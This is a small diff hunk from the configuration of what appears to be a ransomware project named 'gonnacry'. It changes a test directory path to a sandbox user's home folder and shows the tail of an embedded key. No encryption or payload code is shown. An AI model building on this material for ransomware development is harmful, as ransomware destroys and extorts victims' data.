@@ -15,7 +15,7 @@ DQIDAQAB
 
 # environment paths
 ransomware_name = "gonnacry"
-test_path = "/home/ah16165/test/"
+test_path = "/home/ubuntusandbox/test/"
 
 home = environment.get_home_path()
 # desktop = environment.get_desktop_path()
